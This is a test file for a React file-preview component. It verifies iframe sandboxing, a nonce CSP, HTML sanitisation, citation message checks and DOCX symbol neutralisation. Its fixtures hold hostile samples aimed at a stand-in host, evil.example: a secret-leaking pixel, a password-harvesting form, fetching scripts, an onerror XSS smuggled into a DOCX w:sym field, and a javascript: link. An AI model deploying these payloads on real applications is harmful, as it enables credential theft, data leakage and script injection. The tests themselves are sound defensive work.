import React from 'react';
import { describe, it, expect, afterEach, beforeEach, vi } from 'vitest';
import { render, screen, cleanup, waitFor, act } from '@testing-library/react';
import { Theme } from '@radix-ui/themes';
import JSZip from 'jszip';
import { FilePreviewRenderer } from '../renderers/file-preview-renderer';
import { SandboxedHtmlFrame } from '../sandboxed-html-frame';
import {
  CITATION_CLICK,
  SET_ACTIVE_CITATION,
  buildPreviewDocument,
  parseCitationClick,
  sanitizePreviewHtml,
} from '../sandboxed-html';
import { neutralizeDocxSymbols } from '../renderers/docx-renderer';
import type { PreviewCitation } from '../types';

vi.mock('react-i18next', () => ({
  useTranslation: () => ({
    t: (key: string, opts?: Record<string, unknown>) => {
      const template = opts?.defaultValue as string | undefined;
      if (template === undefined) return key;
      return template.replace(/\{\{(\w+)\}\}/g, (_m, name: string) => String(opts?.[name]));
    },
  }),
}));

const h = React.createElement;

const MALICIOUS_HTML = `
  <h1>Quarterly report</h1>
  <p>Revenue grew.</p>
  <img src="https://evil.example/pixel.png?d=secret" alt="pixel">
  <form action="https://evil.example/collect" method="post">
    <input name="password" type="password"><button type="submit">Sign in</button>
  </form>
  <div style="background:url(https://evil.example/bg)">styled</div>
  <script>fetch('https://evil.example/js')</script>
  <script nonce="guess">fetch('https://evil.example/js2')</script>
`;

const CITATIONS = [
  { id: 'c1', content: 'Revenue grew.' },
  { id: 'c2', content: 'Quarterly report' },
] as PreviewCitation[];

function mockFetchBody(body: string) {
  vi.stubGlobal(
    'fetch',
    vi.fn(async () => ({ ok: true, text: async () => body })),
  );
}

function renderPreview(fileType: string, fileName: string, fileUrl = 'blob:http://localhost/preview-1') {
  return render(
    h(Theme, null, h(FilePreviewRenderer, { fileUrl, fileName, fileType })),
  );
}

async function findPreviewIframe(container: HTMLElement): Promise<HTMLIFrameElement> {
  await waitFor(() => expect(container.querySelector('iframe')).not.toBeNull(), { timeout: 5000 });
  return container.querySelector('iframe') as HTMLIFrameElement;
}

function cspOf(srcdoc: string): string {
  return /<meta http-equiv="Content-Security-Policy" content="([^"]*)">/.exec(srcdoc)?.[1] ?? '';
}

function nonceOf(srcdoc: string): string {
  return /script-src 'nonce-([0-9a-f]+)'/.exec(cspOf(srcdoc))?.[1] ?? '';
}

beforeEach(() => {
  mockFetchBody(MALICIOUS_HTML);
  // jsdom has no CSS.escape; the highlighter uses it for class selectors.
  vi.stubGlobal('CSS', { escape: (v: string) => v.replace(/[^\w-]/g, '\\$&') });
});
afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
});

describe('HTML artifact preview isolation', () => {
  // T28
  it('renders in an iframe whose sandbox is exactly allow-scripts, with a nonce CSP first in <head>', async () => {
    const { container } = renderPreview('text/html', 'report.html');
    const iframe = await findPreviewIframe(container);

    expect(iframe.getAttribute('sandbox')).toBe('allow-scripts');
    expect(iframe.hasAttribute('src')).toBe(false);
    const srcdoc = iframe.getAttribute('srcdoc') ?? '';
    const nonce = nonceOf(srcdoc);
    expect(nonce).toMatch(/^[0-9a-f]{32}$/);
    expect(cspOf(srcdoc)).toBe(
      `default-src 'none'; script-src 'nonce-${nonce}'; img-src data: blob:; style-src 'unsafe-inline'; font-src data:`,
    );
    expect(srcdoc.indexOf('Content-Security-Policy')).toBeLessThan(srcdoc.indexOf('Quarterly report'));
  });

  // T29
  it('keeps forms, content scripts and remote images out of the app and the frame', async () => {
    const { container } = renderPreview('text/html', 'report.html');
    const iframe = await findPreviewIframe(container);
    const srcdoc = iframe.getAttribute('srcdoc') ?? '';

    expect(document.querySelector('form')).toBeNull();
    expect(document.querySelector('input[type="password"]')).toBeNull();
    expect(document.querySelector('img[src*="evil.example"]')).toBeNull();
    expect(srcdoc).not.toMatch(/<form|<input|<button/i);
    // Exactly one script: the bridge, carrying this render's nonce.
    const scripts = srcdoc.match(/<script\b[^>]*>/gi) ?? [];
    expect(scripts).toEqual([`<script nonce="${nonceOf(srcdoc)}">`]);
    expect(srcdoc).not.toContain('evil.example/js');
    // The remote <img> survives sanitisation but lives only inside the frame,
    // where img-src data: blob: refuses to fetch it.
    expect(srcdoc).toContain('https://evil.example/pixel.png');
    expect(cspOf(srcdoc)).not.toMatch(/(img|connect|default)-src[^;]*(https?:|\*)/);
    expect(srcdoc).toContain('Quarterly report');
  });

  it('uses a fresh nonce for every render', () => {
    const html = sanitizePreviewHtml('<p>x</p>');
    const a = render(h(SandboxedHtmlFrame, { sanitizedHtml: html, title: 't', dark: false }));
    const first = nonceOf(a.container.querySelector('iframe')?.getAttribute('srcdoc') ?? '');
    cleanup();
    const b = render(h(SandboxedHtmlFrame, { sanitizedHtml: html, title: 't', dark: false }));
    const second = nonceOf(b.container.querySelector('iframe')?.getAttribute('srcdoc') ?? '');
    expect(first).toMatch(/^[0-9a-f]{32}$/);
    expect(second).toMatch(/^[0-9a-f]{32}$/);
    expect(first).not.toBe(second);
  });

  // T30
  it('renders SVG previews as an <img> (no scripts, no subresources), never inline', async () => {
    const svgUrl = 'blob:http://localhost/svg-1';
    const { container } = renderPreview('image/svg+xml', 'diagram.svg', svgUrl);
    const img = container.querySelector('img');
    expect(img?.getAttribute('src')).toBe(svgUrl);
    expect(container.querySelector('svg')).toBeNull();
    expect(container.querySelector('iframe')).toBeNull();
  });

  // T33
  it('still renders ordinary image and HTML artifact previews', async () => {
    const { container } = renderPreview('image/png', 'chart.png', 'blob:http://localhost/png-1');
    expect(container.querySelector('img')?.getAttribute('src')).toBe('blob:http://localhost/png-1');
    cleanup();

    mockFetchBody('<h2>Summary</h2><img src="data:image/png;base64,iVBORw0KGgo=" alt="inline">');
    const html = renderPreview('text/html', 'summary.html');
    const iframe = await findPreviewIframe(html.container);
    const srcdoc = iframe.getAttribute('srcdoc') ?? '';
    expect(srcdoc).toContain('<h2>Summary</h2>');
    expect(srcdoc).toContain('src="data:image/png;base64,iVBORw0KGgo="');
  });
});

describe('HTML preview citation bridge', () => {
  function renderFrame(props: Partial<React.ComponentProps<typeof SandboxedHtmlFrame>> = {}) {
    const onHighlightClick = vi.fn();
    const base = {
      sanitizedHtml: sanitizePreviewHtml('<h1>Quarterly report</h1><p>Revenue grew.</p>'),
      title: 'report.html',
      dark: false,
      citations: CITATIONS,
      activeCitationId: 'c1',
      onHighlightClick,
      ...props,
    };
    const view = render(h(SandboxedHtmlFrame, base));
    const iframe = view.container.querySelector('iframe') as HTMLIFrameElement;
    return { ...view, iframe, onHighlightClick, base };
  }

  it('bakes highlights into the document and ships the bridge script', () => {
    const { iframe } = renderFrame();
    const srcdoc = iframe.getAttribute('srcdoc') ?? '';
    const body = srcdoc.slice(srcdoc.indexOf('<body>'));
    expect(body).toMatch(/<span class="[^"]*\bhighlight-c1\b[^"]*"[^>]*data-highlight-id="c1"[^>]*>Revenue grew\.<\/span>/);
    expect(srcdoc).toContain(SET_ACTIVE_CITATION);
    expect(srcdoc).toContain(CITATION_CLICK);
  });

  it('posts active-citation changes to the frame instead of rebuilding it', () => {
    const { iframe, rerender, base } = renderFrame();
    const frameWindow = iframe.contentWindow as Window;
    const post = vi.spyOn(frameWindow, 'postMessage');
    const before = iframe.getAttribute('srcdoc');

    rerender(h(SandboxedHtmlFrame, { ...base, activeCitationId: 'c2' }));

    expect(iframe.getAttribute('srcdoc')).toBe(before);
    expect(post).toHaveBeenCalledWith({ type: SET_ACTIVE_CITATION, id: 'c2' }, '*');
  });

  it('forwards a highlight click only when it comes from its own frame', () => {
    const { iframe, onHighlightClick } = renderFrame();
    const send = (source: MessageEventSource | null, data: unknown) =>
      act(() => {
        window.dispatchEvent(new MessageEvent('message', { data, source }));
      });

    send(window, { type: CITATION_CLICK, id: 'c1' });
    send(null, { type: CITATION_CLICK, id: 'c1' });
    expect(onHighlightClick).not.toHaveBeenCalled();

    send(iframe.contentWindow, { type: 'something-else', id: 'c1' });
    send(iframe.contentWindow, { type: CITATION_CLICK, id: 42 });
    send(iframe.contentWindow, { type: CITATION_CLICK, id: 'not-a-citation' });
    expect(onHighlightClick).not.toHaveBeenCalled();

    send(iframe.contentWindow, { type: CITATION_CLICK, id: 'c2' });
    expect(onHighlightClick).toHaveBeenCalledExactlyOnceWith('c2');
  });

  it('parseCitationClick rejects malformed payloads', () => {
    const known = new Set(['c1']);
    expect(parseCitationClick({ type: CITATION_CLICK, id: 'c1' }, known)).toBe('c1');
    for (const bad of [null, 'c1', [], { type: CITATION_CLICK }, { type: CITATION_CLICK, id: '' },
      { type: CITATION_CLICK, id: 'x'.repeat(300) }, { type: SET_ACTIVE_CITATION, id: 'c1' }]) {
      expect(parseCitationClick(bad, known)).toBeNull();
    }
  });

  it('buildPreviewDocument never lets a content script carry the nonce', () => {
    const doc = buildPreviewDocument({
      sanitizedHtml: sanitizePreviewHtml('<p>a</p><script nonce="abc">x()</script>'),
      nonce: 'abc',
      dark: false,
    });
    expect(doc.match(/<script\b/gi)).toHaveLength(1);
    expect(doc).not.toContain('x()');
  });
});

async function buildDocx(bodyXml: string, extraRels = '', extraFiles: Record<string, string> = {}): Promise<ArrayBuffer> {
  const zip = new JSZip();
  zip.file('[Content_Types].xml', `<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="html" ContentType="text/html"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>`);
  zip.file('_rels/.rels', `<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>`);
  zip.file('word/_rels/document.xml.rels', `<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${extraRels}</Relationships>`);
  zip.file('word/document.xml', `<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <w:body>${bodyXml}</w:body>
</w:document>`);
  for (const [name, content] of Object.entries(extraFiles)) zip.file(name, content);
  return zip.generateAsync({ type: 'arraybuffer' });
}

describe('DOCX preview isolation', () => {
  const MALICIOUS_BODY = `
    <w:p><w:r><w:t>Board minutes</w:t></w:r></w:p>
    <w:p><w:r><w:sym w:font="Symbol" w:char="41;&lt;img src=x onerror=&quot;window.__docxXss=1&quot;&gt;"/></w:r></w:p>
    <w:p><w:hyperlink r:id="rIdLink"><w:r><w:t>click me</w:t></w:r></w:hyperlink></w:p>
    <w:altChunk r:id="rIdChunk"/>`;
  const MALICIOUS_RELS = `
    <Relationship Id="rIdLink" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:window.__docxXss=2" TargetMode="External"/>
    <Relationship Id="rIdChunk" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk" Target="chunk.html"/>`;

  it('renders DOCX inside the sandboxed frame with no script paths into the app', async () => {
    const docx = await buildDocx(MALICIOUS_BODY, MALICIOUS_RELS, {
      'word/chunk.html': '<html><body><script>parent.__docxXss=3</script>chunk</body></html>',
    });
    // jsdom's Blob has no arrayBuffer(), so feed the renderer through fetch.
    vi.stubGlobal('fetch', vi.fn(async () => ({ ok: true, arrayBuffer: async () => docx })));
    const view = render(
      h(Theme, null, h(FilePreviewRenderer, {
        fileUrl: 'blob:http://localhost/docx-1',
        fileName: 'minutes.docx',
        fileType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      })),
    );
    const iframe = await findPreviewIframe(view.container);
    const srcdoc = iframe.getAttribute('srcdoc') ?? '';

    expect(iframe.getAttribute('sandbox')).toBe('allow-scripts');
    expect(srcdoc).toContain('Board minutes');
    expect(srcdoc).toContain('class="docx-wrapper"');
    expect(srcdoc).not.toMatch(/onerror|javascript:|<iframe/i);
    expect(srcdoc.match(/<script\b/gi)).toHaveLength(1);
    expect(view.container.querySelector('.docx-wrapper')).toBeNull();
    expect((window as unknown as { __docxXss?: number }).__docxXss).toBeUndefined();
  });

  it('neutralizes the w:sym injection in a real parsed document before docx-preview renders it', async () => {
    const docxPreview = await import('docx-preview');
    const options = { inWrapper: true, renderAltChunks: false, useBase64URL: true };
    const parsed = await docxPreview.parseAsync(await buildDocx(MALICIOUS_BODY, MALICIOUS_RELS), options);

    const unsafe = document.createElement('div');
    await docxPreview.renderDocument(parsed, unsafe, undefined, options);
    expect(unsafe.querySelector('img[onerror]')).not.toBeNull();

    neutralizeDocxSymbols((parsed as unknown as { parts: unknown[] }).parts);
    const safe = document.createElement('div');
    await docxPreview.renderDocument(parsed, safe, undefined, options);
    expect(safe.querySelector('img')).toBeNull();
    expect(safe.innerHTML).not.toContain('onerror');
    expect(safe.textContent).toContain('Board minutes');
  });

  it('neutralizeDocxSymbols keeps hex code points and replaces anything else', () => {
    const good = { type: 'symbol', char: 'F0B7' };
    const bad = { type: 'symbol', char: '41;<img src=x onerror=alert(1)>' };
    const part = { body: { children: [{ type: 'paragraph', children: [good, { type: 'run', children: [bad] }] }] } };
    neutralizeDocxSymbols([part]);
    expect(good.char).toBe('F0B7');
    expect(bad.char).toBe('FFFD');
  });
});

describe('Markdown file preview', () => {
  it('uses the same click-to-load policy for remote images', async () => {
    mockFetchBody('# Notes\n\n![x](https://evil.example/p?d=secret)\n\n![ok](data:image/png;base64,iVBORw0KGgo=)');
    const { container } = renderPreview('text/markdown', 'notes.md');
    await screen.findByText('Image from evil.example not loaded');
    const srcs = Array.from(container.querySelectorAll('img')).map((i) => i.getAttribute('src'));
    expect(srcs).toEqual(['data:image/png;base64,iVBORw0KGgo=']);
  });
});
